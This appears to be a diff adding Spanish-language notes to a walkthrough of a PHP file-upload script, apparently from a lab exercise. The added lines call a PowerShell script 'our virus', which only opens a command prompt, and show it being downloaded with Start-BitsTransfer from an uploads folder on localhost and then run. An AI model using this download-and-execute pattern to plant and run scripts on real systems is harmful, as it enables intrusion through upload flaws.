@@ -87,3 +87,11 @@ if ($uploadOk == 0) {
 }
 ?>
 ```
+# Nuestro virus ----->
+```powershell
+Start-Proccess cmd
+```
+# Ejecución de nuestro virus
+Start-BitsTransfer -Source 'https://localhost/uploads/virus.ps1'
+
+.\virus.ps1
